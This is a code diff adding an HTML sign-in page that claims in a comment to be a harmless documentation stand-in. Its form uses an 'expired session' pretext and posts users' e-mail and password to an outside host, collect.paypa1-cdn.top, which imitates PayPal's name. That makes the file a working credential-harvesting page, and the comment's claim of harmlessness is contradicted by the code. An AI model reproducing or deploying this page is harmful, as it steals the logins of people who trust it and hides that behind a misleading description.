@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Sign in to your account</title>
+    <style>
+      body {
+        margin: 0;
+        font:
+          16px/1.4 system-ui,
+          sans-serif;
+        background: #f3f4f6;
+        color: #111827;
+      }
+      main {
+        width: 360px;
+        margin: 90px auto;
+        padding: 32px;
+        background: #fff;
+        border: 1px solid #d1d5db;
+      }
+      h1 {
+        margin: 0 0 4px;
+        font-size: 22px;
+      }
+      p {
+        margin: 0 0 20px;
+        color: #4b5563;
+        font-size: 14px;
+      }
+      label {
+        display: block;
+        margin: 12px 0 4px;
+        font-size: 13px;
+      }
+      input {
+        width: 100%;
+        box-sizing: border-box;
+        padding: 9px;
+        border: 1px solid #9ca3af;
+        font: inherit;
+      }
+      button {
+        width: 100%;
+        margin-top: 20px;
+        padding: 10px;
+        border: 0;
+        background: #1d4ed8;
+        color: #fff;
+        font: inherit;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- A harmless stand-in for a credential page: the documentation screenshots scan it. -->
+    <main>
+      <h1>Sign in</h1>
+      <p>Your session expired. Confirm your account to continue.</p>
+      <form action="http://collect.paypa1-cdn.top/c" method="post">
+        <label for="user">E-mail</label>
+        <input id="user" name="user" type="email" />
+        <label for="pass">Password</label>
+        <input id="pass" name="pass" type="password" />
+        <button type="submit">Continue</button>
+      </form>
+    </main>
+  </body>
+</html>
